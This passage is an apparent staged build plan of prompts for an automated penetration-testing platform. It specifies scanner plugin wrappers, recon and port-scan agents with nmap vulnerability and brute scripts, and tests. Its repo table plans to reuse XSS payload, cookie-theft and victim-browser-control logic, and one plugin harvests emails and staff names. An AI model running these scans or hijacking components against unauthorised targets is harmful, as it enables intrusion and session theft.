    "severity": "HIGH" if vulnerable else "INFO",
    "alg_none": ..., "weak_secret": ...,
    "tool": "jwt_tool"
  }

─────────────────────────────────────────

FILE: backend/plugins/corsy.py

metadata:
  name: "corsy"
  binary_name: "python3"
  category: "VULN"
  supports_json_output: True
  default_timeout: 120

build_command(input):
  corsy_path = "/opt/tools/corsy/corsy.py"
  input_file = extra_params.get("input_file")
  ["python3", corsy_path,
   "-i", input_file,
   "-t", "20",
   "--headers", "User-Agent: Mozilla/5.0",
   "-q"]

parse_output(raw):
  JSON output per URL
  Find URLs with:
    "wildcard_origin_allowed", 
    "credentialed_requests_allowed"
  Return: {
    "title": "CORS Misconfiguration",
    "severity": "MEDIUM",
    "affected_url": ...,
    "cors_type": ...,
    "tool": "corsy"
  }

─────────────────────────────────────────

FILE: backend/plugins/tplmap.py

metadata:
  name: "tplmap"
  binary_name: "python3"
  category: "VULN"
  supports_json_output: False
  default_timeout: 120

build_command(input):
  tplmap_path = "/opt/tools/tplmap/tplmap.py"
  url = extra_params.get("url", input.target)
  ["python3", tplmap_path,
   "-u", url,
   "--level", "3",
   "--engine", "all"]

parse_output(raw):
  Scan text for:
    "Template injection vulnerability" → vulnerable = True
    "Engine:" → template engine name
  Return: {
    "title": "Server-Side Template Injection",
    "severity": "CRITICAL",
    "template_engine": ...,
    "tool": "tplmap"
  }

─────────────────────────────────────────

FILE: backend/plugins/subjack.py

metadata:
  name: "subjack"
  binary_name: "subjack"
  category: "VULN"
  supports_json_output: True
  default_timeout: 120

build_command(input):
  input_file = extra_params.get("input_file")
  [binary_path, "-w", input_file,
   "-t", "100", "-timeout", "30",
   "-json", "-o", output_file,
   "-ssl", "-c",
   "/opt/tools/subjack/fingerprints.json"]

parse_output(raw):
  JSON: [{"subdomain":..., "vulnerable":true, "service":...}]
  Filter where vulnerable == True
  Return: {
    "title": "Subdomain Takeover",
    "severity": "HIGH",
    "subdomain": ...,
    "vulnerable_service": service,
    "tool": "subjack"
  }

─────────────────────────────────────────

FILE: backend/plugins/wpscan_plugin.py

metadata:
  name: "wpscan_plugin"
  binary_name: "wpscan"
  category: "VULN"
  supports_json_output: True
  default_timeout: 300

build_command(input):
  [binary_path, "--url", input.target,
   "--format", "json",
   "--output", output_file,
   "--enumerate", "p,t,u,vp,vt",
   "--plugins-detection", "mixed",
   "--random-user-agent"]

parse_output(raw):
  WPScan JSON: {
    "vulnerabilities": [...],
    "plugins": {...},
    "themes": {...},
    "version": {...}
  }
  Extract all vulnerabilities with CVE IDs
  Return list of: {
    "title": ..., "severity": ..., "cve_id": ...,
    "component": plugin/theme/core,
    "tool": "wpscan"
  }

Generate all 8 files. Stop after.
```

---

### Step 3.7 — Secret + Cloud Plugins

```
PHASE 3 — STEP 7

Generate these 7 plugin files in one response.

─────────────────────────────────────────

FILE: backend/plugins/trufflehog.py

metadata:
  name: "trufflehog"
  binary_name: "trufflehog"
  category: "SECRET"
  supports_json_output: True
  fallback_plugin: "gitleaks"
  default_timeout: 300

build_command(input):
  mode = extra_params.get("mode", "filesystem")
  
  if mode == "filesystem":
    [binary_path, "filesystem",
     extra_params["path"],
     "--json", "--no-update"]
  
  if mode == "github":
    [binary_path, "github",
     "--org", input.target,
     "--json", "--no-update",
     "--token", settings.GITHUB_TOKEN]

parse_output(raw):
  Each line JSON: {
    "SourceMetadata": {"file","line"},
    "DetectorName": "AWS", "Raw": "AKIA...",
    "Verified": true/false
  }
  Return: {
    "title": f"{DetectorName} Secret Exposed",
    "severity": "CRITICAL" if Verified else "HIGH",
    "secret_type": DetectorName,
    "secret_value": Raw[:20] + "..." (truncated),
    "file": file, "line": line,
    "is_verified": Verified,
    "tool": "trufflehog"
  }

─────────────────────────────────────────

FILE: backend/plugins/gitleaks.py

metadata:
  name: "gitleaks"
  binary_name: "gitleaks"
  category: "SECRET"
  supports_json_output: True
  fallback_plugin: None
  default_timeout: 180

build_command(input):
  path = extra_params.get("path", ".")
  [binary_path, "detect",
   "--source", path,
   "--report-format", "json",
   "--report-path", output_file,
   "--no-git", "--redact"]

parse_output(raw):
  JSON array: [{
    "Description", "StartLine", "File",
    "Secret", "RuleID", "Commit"
  }]
  Return: {
    "title": f"Secret: {Description}",
    "severity": "HIGH",
    "secret_type": RuleID,
    "file": File, "line": StartLine,
    "tool": "gitleaks"
  }

─────────────────────────────────────────

FILE: backend/plugins/secretfinder.py

metadata:
  name: "secretfinder"
  binary_name: "python3"
  category: "SECRET"
  supports_json_output: False
  default_timeout: 60

build_command(input):
  sf_path = "/opt/tools/SecretFinder/SecretFinder.py"
  js_url = extra_params.get("js_url", input.target)
  ["python3", sf_path,
   "-i", js_url,
   "-o", "cli"]

parse_output(raw):
  Text output with regex matches
  Look for patterns:
    "google_api", "aws_access_key", "jwt_token",
    "firebase", "azure", "generic_secret"
  Return: {
    "title": f"Secret in JavaScript: {match_type}",
    "severity": "HIGH",
    "secret_type": match_type,
    "js_url": js_url,
    "evidence": matched_string[:50],
    "tool": "secretfinder"
  }

─────────────────────────────────────────

FILE: backend/plugins/linkfinder.py

metadata:
  name: "linkfinder"
  binary_name: "python3"
  category: "ENUM"
  supports_json_output: False
  default_timeout: 60

build_command(input):
  lf_path = "/opt/tools/LinkFinder/linkfinder.py"
  js_url = extra_params.get("js_url", input.target)
  ["python3", lf_path,
   "-i", js_url,
   "-o", "cli"]

parse_output(raw):
  Plain text list of endpoints
  Return: {
    "url": endpoint,
    "source_js": js_url,
    "is_api": "/api" in endpoint,
    "is_internal": not endpoint.startswith("http"),
    "tool": "linkfinder"
  }

─────────────────────────────────────────

FILE: backend/plugins/s3scanner.py

metadata:
  name: "s3scanner"
  binary_name: "s3scanner"
  category: "CLOUD"
  supports_json_output: True
  default_timeout: 120

build_command(input):
  buckets_file = extra_params.get("buckets_file")
  [binary_path, "scan",
   "--buckets-file", buckets_file,
   "--threads", "20",
   "--json"]

parse_output(raw):
  Each line JSON: {
    "bucket": "name", "exists": true,
    "public": true, "region": "us-east-1",
    "objects": count
  }
  Filter where exists == True AND public == True
  Return: {
    "title": "Public S3 Bucket Exposed",
    "severity": "HIGH",
    "bucket_name": bucket,
    "region": region,
    "object_count": objects,
    "tool": "s3scanner"
  }

─────────────────────────────────────────

FILE: backend/plugins/cloud_enum.py

metadata:
  name: "cloud_enum"
  binary_name: "python3"
  category: "CLOUD"
  supports_json_output: False
  default_timeout: 300

build_command(input):
  ce_path = "/opt/tools/cloud_enum/cloud_enum.py"
  keyword = extra_params.get("keyword", input.target.split(".")[0])
  ["python3", ce_path,
   "-k", keyword,
   "--disable-azure" if not extra_params.get("azure") else "",
   "-l", output_file]

parse_output(raw):
  Text output, scan for:
    "OPEN" → public resource found
    "s3.amazonaws.com" → S3 bucket
    "blob.core.windows.net" → Azure blob
    "storage.googleapis.com" → GCP bucket
  Return: {
    "title": "Public Cloud Resource Found",
    "severity": "HIGH",
    "cloud_provider": "AWS/Azure/GCP",
    "resource_url": ...,
    "is_public": True,
    "tool": "cloud_enum"
  }

─────────────────────────────────────────

FILE: backend/plugins/scrapegraph_plugin.py

metadata:
  name: "scrapegraph_plugin"
  binary_name: None (Python library)
  category: "RECON"
  supports_json_output: True
  default_timeout: 60

execute(input) → override (no subprocess):
  Import SmartScraperGraph from scrapegraphai
  config = {
    "llm": {
      "api_key": settings.ANTHROPIC_API_KEY,
      "model": "anthropic/claude-sonnet-4-6"
    }
  }
  prompt = extra_params.get("prompt",
    "Extract: company description, technologies used,
     contact emails, social links, team members,
     any security-relevant information")
  
  scraper = SmartScraperGraph(
    prompt=prompt,
    source=input.target,
    config=config
  )
  result = scraper.run()
  Return PluginOutput with result as parsed_data

parse_output(raw):
  Already structured dict from ScrapeGraphAI
  Return as-is

health_check():
  Return True if ANTHROPIC_API_KEY is set in settings

Generate all 7 files. Stop after.
```

---

### Step 3.8 — Phase 3 Verification

```
PHASE 3 — STEP 8 — FINAL VERIFICATION

Phase 3 complete. Write tests/test_plugins.py

Test cases:

1. test_plugin_registry_auto_discover
   Call registry.auto_discover()
   Assert len(registry.list_all()) >= 30

2. test_base_plugin_timeout_handling
   Create mock plugin where subprocess sleeps 999s
   Set timeout=1
   Assert PluginOutput.success == False
   Assert "TIMEOUT" in output.error_message
   Assert no exception raised to caller

3. test_subfinder_parse_output
   Feed mock subfinder JSON output (3 subdomains)
   Assert parse_output returns list of 3 dicts
   Assert each dict has "subdomain" key

4. test_nuclei_parse_output
   Feed mock nuclei JSON with one critical finding
   Assert severity == "CRITICAL"
   Assert cve_id present

5. test_fallback_plugin_metadata
   For each plugin that has fallback_plugin set:
   Assert fallback_plugin name is also registered

6. test_plugin_output_quality_score
   PluginOutput with record_count=0 → quality < 0.3
   PluginOutput with record_count=10 → quality >= 0.5

7. test_executor_runs_plugin
   Mock subprocess, run executor.run("subfinder", input)
   Assert returns PluginOutput
   Assert command_executed is populated

8. test_health_checker_missing_binary
   Create plugin with binary_name="nonexistent_binary_xyz"
   Assert health_check() returns False
   Assert no exception raised

Run: pytest tests/test_plugins.py -v
All 8 must pass before Phase 3 is marked complete.
```

---
---

# PHASE 4 — RECON AGENT

---

### Step 4.0 — Phase 4 Master Context

```
PHASE 4 — RECON AGENT

Phases 0, 1, 2, 3 complete. All plugins exist.
Now building the first agent in the scan pipeline.

The Recon Agent:
- Is a Celery worker process subscribed to recon_queue
- Receives one job: {scan_id, target, tools_to_run}
- Runs all recon tools via PluginExecutor
- Writes all results to PostgreSQL via async SQLAlchemy
- Fires recon_complete event via EventBus when done
- Handles partial failures gracefully (one tool fails,
  rest continue)
- Sends real-time progress to WebSocket via EventBus
- Never crashes the entire scan because one tool failed

This phase builds:
1. Recon Agent Celery task
2. Recon Result Processor (parses + stores recon output)
3. Subdomain Deduplicator (merges results from 5 tools)
4. DNS Resolver (enriches subdomains with DNS data)

Token rule:
Generate in order, wait for "next" between each:
  Step 4.1: Recon Agent Task
  Step 4.2: Result Processor
  Step 4.3: Subdomain Deduplicator + DNS Enricher
  Step 4.4: Verification
```

---

### Step 4.1 — Recon Agent Celery Task

```
PHASE 4 — STEP 1

Generate: backend/workers/recon_agent.py

This file defines all Celery tasks for the recon phase.

Task: recon.start

@celery_app.task(
  bind=True,
  name="recon.start",
  queue="recon_queue",
  max_retries=2,
  autoretry_for=(Exception,),
  default_retry_delay=30
)
def start_recon(self, scan_id: str, target: str,
                tool_decisions: list[dict]) → dict:

Inside the task:
  Run inside asyncio.run() since Celery tasks are sync
  but our code is async:
  return asyncio.run(_async_start_recon(
    task_instance=self,
    scan_id=scan_id,
    target=target,
    tool_decisions=tool_decisions
  ))

Async implementation _async_start_recon():

STEP 1: Initialize
  Get DB session
  Get EventBus instance
  Get PluginExecutor instance
  Update Scan.current_phase = "Reconnaissance"
  Update Scan.current_tool = "Initializing"
  Log: "Recon started for {target} scan_id={scan_id}"

STEP 2: Run subdomain discovery tools in sequence
  Tools to run (from tool_decisions filtered by category RECON):
    subfinder, amass, assetfinder, findomain, chaos, crtsh

  For each tool:
    Publish ToolStartedEvent(scan_id, tool_name, task_id)
    Update Scan.current_tool = tool_name in DB
    Call executor.run(tool_name, PluginInput(scan_id, target))
    Publish ToolCompleteEvent or ToolFailedEvent
    Collect raw results into all_subdomain_results list
    
    On failure:
      Log warning (do not raise)
      Continue to next tool
      (FallbackManager handles this via ToolFailedEvent)

STEP 3: Deduplicate subdomains
  Pass all_subdomain_results to SubdomainDeduplicator
  Get unique_subdomains list

STEP 4: Run DNS enrichment
  Pass unique_subdomains to DNSEnricher
  Run dnsx plugin on all subdomains
  Get dns_enriched_subdomains

STEP 5: Run remaining recon tools in parallel
  asyncio.gather():
    whois_plugin on target
    asnmap on target
    theharvester on target
    gowitness on live subdomains (pass as file)

STEP 6: Store all results
  Call ReconResultProcessor.store_all(
    scan_id=scan_id,
    subdomains=dns_enriched_subdomains,
    whois_data=whois_result,
    asn_data=asn_result,
    email_data=harvester_result,
    screenshots=gowitness_result,
    db=db_session
  )

STEP 7: Update scan stats
  Update Scan.total_assets = len(unique_subdomains)
  Update Scan.progress = 20
  Update Domain.state → DISCOVERED for all

STEP 8: Fire completion event
  Publish ReconCompleteEvent(
    scan_id=scan_id,
    subdomain_count=len(unique_subdomains),
    dns_records=dns_summary,
    asn_data=asn_data
  )
  Log: "Recon complete. {count} subdomains found."

STEP 9: Return summary dict
  Return {
    "scan_id": scan_id,
    "subdomain_count": count,
    "tools_succeeded": [...],
    "tools_failed": [...],
    "execution_time": total_seconds
  }

Error handling at task level:
  If STEP 1 fails → mark scan FAILED, return early
  If STEP 2 all tools fail → fire ReconCompleteEvent
    with subdomain_count=0 (scan continues, enum will
    just have no targets)
  If STEP 6 (DB write) fails → retry task up to 2 times

Generate recon_agent.py only. Stop after.
```

---

### Step 4.2 — Recon Result Processor

```
PHASE 4 — STEP 2

Generate: backend/workers/processors/recon_processor.py

ReconResultProcessor class:

store_all(scan_id, subdomains, whois_data, asn_data,
          email_data, screenshots, db) → async → ReconSummary

  Calls each store method in order:
    await store_subdomains(scan_id, subdomains, db)
    await store_whois(scan_id, whois_data, db)
    await store_asn(scan_id, asn_data, db)
    await store_emails(scan_id, email_data, db)
    await store_screenshots(scan_id, screenshots, db)
  Returns ReconSummary dataclass

store_subdomains(scan_id, subdomains, db) → async → int
  For each subdomain in list:
    Check if Subdomain with same name + scan_id exists
    If exists: skip (deduplication at DB level too)
    If not: create Subdomain record with:
      name, ip_address (from dns data),
      a_records, cname, mx_records, txt_records,
      source (which tool found it),
      state = DISCOVERED,
      scan_id
  Use bulk insert for performance:
    db.execute(insert(Subdomain).values(batch))
    Commit every 100 records
  Return count of inserted subdomains

store_whois(scan_id, whois_data, db) → async
  Find Domain record for scan_id
  Update with:
    registrar, registration_date, expiry_date,
    nameservers, whois_data (full JSON)
  Commit

store_asn(scan_id, asn_data, db) → async
  Find Domain record
  Update with: asn, asn_org, hosting_provider
  Commit

store_emails(scan_id, email_data, db) → async
  Store in a findings-like format tagged as INFO severity
  Title: "Email Addresses Discovered via OSINT"
  Evidence: JSON list of emails found
  tool_found_by: "theharvester"

store_screenshots(scan_id, screenshots, db) → async
  For each screenshot result:
    Find Subdomain by URL
    Update screenshot_path field
    Commit

ReconSummary dataclass:
  scan_id: str
  subdomain_count: int
  dns_record_count: int
  has_wildcard_dns: bool
  email_count: int
  asn_count: int
  failed_tools: list[str]

Generate recon_processor.py only. Stop after.
```

---

### Step 4.3 — Subdomain Deduplicator + DNS Enricher

```
PHASE 4 — STEP 3

Generate these 2 files:
backend/workers/processors/deduplicator.py
backend/workers/processors/dns_enricher.py

deduplicator.py requirements:

SubdomainDeduplicator class:

deduplicate(results: list[PluginOutput],
            target: str) → list[dict]

  Input: list of PluginOutput from 5-6 different tools
  Each PluginOutput.parsed_data is list of
    {"subdomain": "api.example.com", "source": "subfinder"}

  Algorithm:
    STEP 1: Flatten all parsed_data into one list
    STEP 2: Normalize each subdomain:
      lowercase
      strip leading/trailing dots and spaces
      remove protocol prefix (http://, https://)
      remove trailing slash
    STEP 3: Validate each subdomain:
      Must end with target domain
      Must match regex: ^[a-z0-9][a-z0-9\-\.]*[a-z0-9]$
      Skip wildcards: *.example.com
      Skip IP addresses
    STEP 4: Deduplicate by subdomain name (use dict)
    STEP 5: Merge sources:
      If "api.example.com" found by both subfinder and amass:
      sources = ["subfinder", "amass"] (not duplicated)
    STEP 6: Return list of clean unique subdomains

  Also provide:
    get_stats(before_count, after_count) → dict
      Returns {"before": x, "after": y, "duplicates_removed": z}

─────────────────────────────────────────

dns_enricher.py requirements:

DNSEnricher class:

enrich(subdomains: list[dict],
       scan_id: str) → async → list[dict]

  Takes list of unique subdomain dicts
  Runs dnsx plugin on all of them:
    Writes subdomains to temp file
    Passes to dnsx_plugin via executor.run()
    Parses dnsx output (already handled by plugin)

  For each dnsx result, merge into subdomain dict:
    a_records, cname, mx_records, txt_records,
    ns_records, ip_address (first A record)

  Flag special cases:
    wildcard_dns: if *.example.com resolves
    cname_to_external: CNAME pointing outside target domain
    no_records: subdomain with no DNS records
      (potential dangling DNS)
    has_mx: subdomain with MX records (mail server)

  Return enriched subdomain list

  Batch processing:
    Write subdomains to temp file in batches of 500
    Run dnsx on each batch
    Merge results
    Clean up temp files after

  get_potential_takeovers(subdomains) → list[dict]
    Filter subdomains where:
      cname_to_external == True
      AND cname points to known cloud services:
        *.s3.amazonaws.com, *.azurewebsites.net,
        *.github.io, *.heroku.com, *.netlify.app,
        *.surge.sh, *.pantheonsite.io, etc.
    Return list flagged for subjack scan

Generate both files. Stop after.
```

---

### Step 4.4 — Phase 4 Verification

```
PHASE 4 — STEP 4 — FINAL VERIFICATION

Phase 4 complete. Write tests/test_recon_agent.py

Test cases:

1. test_deduplicator_removes_duplicates
   Input: 3 PluginOutputs, same subdomain from each
   Assert: deduplicate() returns list with 1 item
   Assert: sources has all 3 tool names merged

2. test_deduplicator_filters_invalid
   Input: subdomains with wildcards, IPs, wrong domain
   Assert: all filtered out, only valid subdomains returned

3. test_deduplicator_normalization
   Input: "API.Example.COM" and "api.example.com"
   Assert: treated as same subdomain after normalization

4. test_dns_enricher_flags_external_cname
   Input: subdomain with CNAME → *.github.io
   Assert: cname_to_external == True
   Assert: appears in get_potential_takeovers()

5. test_recon_processor_bulk_insert
   Mock DB session
   Input: 150 subdomains
   Assert: insert called in batches (at least 2 batches)
   Assert: all 150 stored

6. test_recon_processor_deduplication_at_db
   Mock DB with existing subdomain
   Try to store same subdomain again
   Assert: no duplicate in DB (upsert behavior)

7. test_recon_agent_continues_on_tool_failure
   Mock executor to fail for "subfinder"
   Assert: amass still runs after subfinder fails
   Assert: recon_complete event still fired
   Assert: no exception propagates out of task

8. test_recon_agent_fires_complete_event
   Mock all tools to return 5 subdomains each
   Run full recon agent
   Assert: ReconCompleteEvent published with
     subdomain_count > 0

Run: pytest tests/test_recon_agent.py -v
All 8 must pass. Phase 4 is only complete when all pass.

After tests pass, run one real integration test:
  docker compose exec backend python -c "
  from backend.workers.recon_agent import start_recon
  result = start_recon.delay(
    scan_id='test-001',
    target='scanme.nmap.org',
    tool_decisions=[...]
  )
  print(result.get(timeout=120))
  "

Expected: dict with subdomain_count >= 1
scanme.nmap.org is a legal scan target.
```

---

## Phase Summary

| Phase | Steps | Key Output | Verify At |
|---|---|---|---|
| Phase 3 | 3.1 → 3.8 | 30+ plugins, registry, executor | Step 3.8 only |
| Phase 4 | 4.1 → 4.4 | Recon Agent, Deduplicator, DNS Enricher | Step 4.4 only |

**Never test individual files. Never verify mid-phase. Always verify only at the final step. Use scanme.nmap.org for all live integration tests — it is the only legal target.**

## Integration Strategy — What to Extract from Each Repo

Before Phase 5 and 6 prompts, this needs to be locked in clearly.

---

### What to Take from Each Cloned Repo

| Repo | What You Extract | Where It Goes in AgentSec AI | What You Discard |
|---|---|---|---|
| **BCHackTool** | Tool execution flow, Subfinder+Nuclei+SQLMap+Httpx shell wrappers, notification logic (Telegram/Slack/Discord), scan checkpoint/resume logic | Copy shell wrapper logic → rewrite as Python plugin classes in `backend/plugins/` | Its CLI menu, its bash orchestration, its report format |
| **authz0** | Authorization testing core engine — YAML-based auth flow runner, token/session rotation logic, role comparison engine | Extract auth test runner → `backend/plugins/authz0_plugin.py` + feed into Vuln Agent auth module | Its standalone CLI, its config file format |
| **claude-bug-bounty** | All vulnerability hunting methodology (IDOR patterns, race condition patterns, OAuth test cases, ATO chain logic, validation gate logic, 7-question validation) | Rewrite as Decision Engine rules in `backend/orchestrator/decision_engine.py` + AI prompt templates in `backend/reports/ai_prompts.py` | Nothing — all methodology logic is valuable |
| **hackingtool** | Tool installer logic (which tools to install, install commands per tool), tool path registry, category groupings | Extract tool list + install commands → `docker/Dockerfile.worker` tool installation section + `backend/plugins/health_checker.py` | Its menu system, its interactive CLI entirely |
| **Session-Hijacking-Visual-Exploitation (SHVE)** | XSS payload generator, JavaScript injection server, cookie theft logic, victim browser controller, screenshot-as-evidence collector | Extract payload gen + injection server → `backend/plugins/shve_plugin.py` in Exploit Agent | Its frontend operator UI (you replace with your dashboard) |
| **ScrapeGraphAI** | Already done — Python library import in `scrapegraph_plugin.py` | Already in Phase 3 Step 3.7 | Nothing extra needed |

---

### How to Physically Do the Extraction

```
agentsec-ai/
└── tools/
    ├── BCHackTool/          ← cloned here, read-only
    ├── authz0/              ← cloned here, read-only
    ├── claude-bug-bounty/   ← cloned here, read-only
    ├── hackingtool/         ← cloned here, read-only
    ├── Session-Hijacking-Visual-Exploitation/  ← read-only
    └── Scrapegraph-ai/      ← read-only

You NEVER import directly from tools/ in production code.
You READ the source there, REWRITE the logic in backend/.
tools/ is your reference library, not a dependency.
```

---

Now the deep prompts.

---

# PHASE 5 — ENUMERATION AGENT

---

### Step 5.0 — Phase 5 Master Context

```
PHASE 5 — ENUMERATION AGENT

Phases 0-4 complete. Recon Agent working.
Now building the Enumeration Agent — the second phase
of the scan pipeline.

The Enumeration Agent:
- Triggers on: recon_complete event
- Input: list of subdomains from Recon Agent (pulled from DB)
- Responsibility:
    1. Detect which subdomains are alive (httpx)
    2. Port scan all live hosts (naabu → nmap)
    3. Fingerprint technologies on each host
    4. Crawl all live hosts for URLs and endpoints
    5. Collect historical URLs (wayback + gau)
    6. Discover hidden directories (ffuf + feroxbuster)
    7. Build complete ScanContext for Decision Engine
    8. Fire enum_complete event

Extraction from cloned repos for this phase:
- BCHackTool: copy its httpx execution flags, 
  its naabu threading config, its checkpoint logic
  → Rewrite in EnumAgent as Python async logic
- hackingtool: reference its tool version/install
  commands for Dockerfile.worker
  
Architecture rules:
- Enumeration Agent runs ONE Celery task: enum.start
- Internally it coordinates sub-tasks for each tool
- Sub-tasks report back to parent task via Redis
- All results written to DB before enum_complete fires
- Live hosts count updates scan progress in real time
- WebSocket push after every tool completes

Token rule:
Generate in order, wait for "next" between each:
  Step 5.1: Enum Agent Task (main Celery task)
  Step 5.2: Live Host Processor
  Step 5.3: Port Scan Coordinator
  Step 5.4: Technology Fingerprinter
  Step 5.5: Web Crawler Coordinator
  Step 5.6: Directory Discovery Coordinator
  Step 5.7: Enum Result Processor
  Step 5.8: ScanContext Builder
  Step 5.9: Verification
```

---

### Step 5.1 — Enum Agent Task

```
PHASE 5 — STEP 1

Generate: backend/workers/enum_agent.py

Task: enum.start

@celery_app.task(
  bind=True,
  name="enum.start",
  queue="enum_queue",
  max_retries=2,
  autoretry_for=(Exception,),
  default_retry_delay=60,
  soft_time_limit=3600,
  time_limit=4200
)
def start_enum(self, scan_id: str,
               recon_summary: dict) → dict:
  return asyncio.run(_async_start_enum(
    self, scan_id, recon_summary
  ))

Async implementation _async_start_enum():

STEP 1: Initialize + load targets
  Get DB session, EventBus, PluginExecutor
  Load all Subdomain records for scan_id from DB
  total_subdomains = len(subdomains)
  
  If total_subdomains == 0:
    Log: "No subdomains to enumerate. Firing enum_complete with empty data."
    Fire EnumCompleteEvent with all counts = 0
    Return early
  
  Update Scan:
    current_phase = "Enumeration"
    current_tool = "Live Host Detection"
    progress = 21

  Write subdomain list to temp file:
    /tmp/agentsec_{scan_id}_subdomains.txt
  
STEP 2: Live host detection (httpx)
  Publish ToolStartedEvent("httpx")
  Update Scan.current_tool = "httpx"
  
  Run httpx_plugin with:
    input_file = temp subdomain file
    timeout = 120
  
  Parse results via LiveHostProcessor
  Store live hosts to DB (update Subdomain.is_alive,
    http_status, https_status, page_title,
    redirect_url, technologies)
  
  live_count = count of alive subdomains
  Update Scan.progress = 30
  Publish WebSocket update:
    {phase: "enum", step: "httpx_complete",
     live_hosts: live_count, total: total_subdomains}
  
  If live_count == 0:
    Log warning: "Zero live hosts detected"
    (continue anyway — port scan may still find things)

STEP 3: Port scanning (naabu → nmap)
  Write live host IPs to temp file
  Run PortScanCoordinator.run(scan_id, live_hosts)
  This handles: naabu fast scan → nmap deep scan
  on top-open-ports
  Store results to DB (Port, Service models)
  Update Scan.progress = 50
  Publish WebSocket update with open port count

STEP 4: Technology fingerprinting
  Run TechnologyFingerprinter.run(scan_id, live_hosts)
  Uses: httpx tech data (already collected in STEP 2)
         + whatweb on interesting hosts
  Store to DB (Technology model)
  Update Scan.progress = 55

STEP 5: Web crawling (parallel)
  For all live hosts that returned 200:
  Run WebCrawlerCoordinator.run(scan_id, live_hosts)
  Uses: katana + waybackurls + gau in parallel
  Store all URLs to DB (Endpoint model)
  Update Scan.progress = 70

STEP 6: Directory discovery
  Run only on live hosts with interesting tech stack
  (WordPress, Laravel, Django, Express etc.)
  Run DirectoryDiscoveryCoordinator.run(
    scan_id, interesting_hosts)
  Uses: ffuf + feroxbuster
  Store discovered paths to Endpoint model
  Update Scan.progress = 85

STEP 7: Build ScanContext
  context = ScanContextBuilder.build(scan_id, db)
  This reads ALL data collected so far
  Returns complete ScanContext for Decision Engine

STEP 8: Store context + fire event
  Store ScanContext as JSON in Scan.scan_config
  Update Scan.progress = 90
  
  Publish EnumCompleteEvent(
    scan_id=scan_id,
    live_host_count=live_count,
    open_ports=port_summary,
    tech_stack=tech_list,
    endpoint_count=endpoint_count
  )
  
  Log: "Enum complete. {live_count} live hosts,
        {port_count} open ports,
        {endpoint_count} endpoints discovered."

STEP 9: Cleanup
  Delete all temp files created in this task
  (/tmp/agentsec_{scan_id}_*)
  Return summary dict

Error handling:
  Any step fails → log error, update Scan.error_message
  Continue to next step (degraded mode)
  Only STEP 1 failure causes full task abort

Generate enum_agent.py only. Stop after.
```

---

### Step 5.2 — Live Host Processor

```
PHASE 5 — STEP 2

Generate: backend/workers/processors/live_host_processor.py

LiveHostProcessor class:

process(httpx_output: PluginOutput,
        scan_id: str,
        db: AsyncSession) → async → LiveHostSummary

  Parse httpx results (already parsed by plugin)
  For each result:
    find Subdomain record by name
    Update fields:
      is_alive = status_code < 500
      http_status = status_code
      page_title = title
      redirect_url = redirect_location
    
    Extract technologies from httpx tech field
    Create Technology records for each detected tech
    
    Check for interesting findings immediately:
      status_code == 401 → flag "Requires Authentication"
      status_code == 403 → flag "Access Forbidden (bypass candidate)"
      "Swagger" or "api-docs" in title → flag "API Docs Exposed"
      "phpMyAdmin" in title → flag "Admin Panel Exposed"
      "Grafana" in title → flag "Monitoring Panel Exposed"
      "Jenkins" in title → flag "CI/CD Panel Exposed"
      "Kibana" in title → flag "Elasticsearch UI Exposed"
    
    For each interesting finding found:
      Create Finding record with:
        severity = HIGH for admin panels
        severity = MEDIUM for API docs
        tool_found_by = "httpx"
        owasp_category = "A02:2025"

  bulk_update subdomains in DB (one query)
  
  Return LiveHostSummary:
    total_checked: int
    alive_count: int
    dead_count: int
    redirected_count: int
    interesting_count: int
    technologies_found: list[str]
    admin_panels_found: list[str]
    api_docs_found: list[str]

segregate_by_tech(live_hosts) → dict[str, list]
  Groups live hosts by detected technology:
  {
    "wordpress": [...hosts...],
    "laravel": [...hosts...],
    "django": [...hosts...],
    "react": [...hosts...],
    "unknown": [...hosts...]
  }
  Used by STEP 6 to decide which hosts get
  directory discovery

get_interesting_hosts(live_hosts) → list[dict]
  Returns hosts worth deeper investigation:
    Has admin panel
    Has API docs exposed
    Returns 401/403 (auth bypass candidate)
    Has unusual status code (206, 500, etc.)

Generate live_host_processor.py only. Stop after.
```

---

### Step 5.3 — Port Scan Coordinator

```
PHASE 5 — STEP 3

Generate: backend/workers/processors/port_scan_coordinator.py

PortScanCoordinator class:

run(scan_id: str,
    live_hosts: list[dict],
    db: AsyncSession) → async → PortScanSummary

  PHASE A: Fast scan with naabu
    Write live host IPs to temp file
    Run naabu_plugin:
      top-ports: 1000
      rate: 1000
      timeout: 300
    Collect open ports from naabu output
    
    If naabu fails (PluginOutput.success == False):
      Log: "Naabu failed, switching to RustScan"
      Run rustscan_plugin as fallback
      
    If rustscan also fails:
      Log: "RustScan failed, falling back to Nmap"
      Run nmap_plugin with -F flag (fast, top 100)

  PHASE B: Deep scan with nmap
    Take only ports found open in PHASE A
    For each host, run nmap with:
      -sV (service version)
      -sC (default scripts)
      -p {comma_joined_open_ports}
    This is much faster than full nmap scan
    because naabu already found the open ports

  PHASE C: Script-based checks on dangerous ports
    For each open port that is dangerous:
      port 445: nmap --script smb-vuln*,smb-security-mode
      port 3306: nmap --script mysql-empty-password
      port 6379: nmap --script redis-info
      port 9200: nmap --script http-elasticsearch-nodes
      port 5432: nmap --script pgsql-brute (minimal)
      port 27017: nmap --script mongodb-info
      port 21: nmap --script ftp-anon
    Run these as asyncio.gather() (parallel)

  PHASE D: Store results
    For each (host, port, service) found:
      Find or create Host record for IP
      Create Port record:
        number, protocol, state, banner,
        is_dangerous (pre-flagged list),
        http_accessible (if port 80/8080/8000/etc.)
        https_accessible (if port 443/8443/etc.)
      Create Service record:
        name, version, product, cpe, extra_info
      If dangerous script found vulnerability:
        Create Finding record immediately
          severity = CRITICAL for anonymous access
          owasp_category = "A02:2025"

  PHASE E: Update Host records
    Update Host.os_detected if nmap detected OS
    Update Host.is_alive = True for all found hosts

  Return PortScanSummary:
    total_hosts_scanned: int
    open_ports_found: int
    dangerous_ports_found: list[int]
    services_identified: list[str]
    immediate_findings: int (from script checks)
    fallback_used: str | None

get_port_context(port_results) → dict
  Returns structured summary for Decision Engine:
  {
    "has_web": any port in [80,443,8080,8443,8000,3000],
    "has_database": any port in [3306,5432,27017,1433],
    "has_smb": 445 in ports,
    "has_redis": 6379 in ports,
    "has_elasticsearch": 9200 in ports,
    "has_ftp": 21 in ports,
    "has_ssh": 22 in ports,
    "all_open_ports": sorted list
  }
  This feeds directly into Decision Engine
  to choose next vulnerability tools

Generate port_scan_coordinator.py only. Stop after.
```

---

### Step 5.4 — Technology Fingerprinter

```
PHASE 5 — STEP 4

Generate: backend/workers/processors/tech_fingerprinter.py

Extracts from BCHackTool:
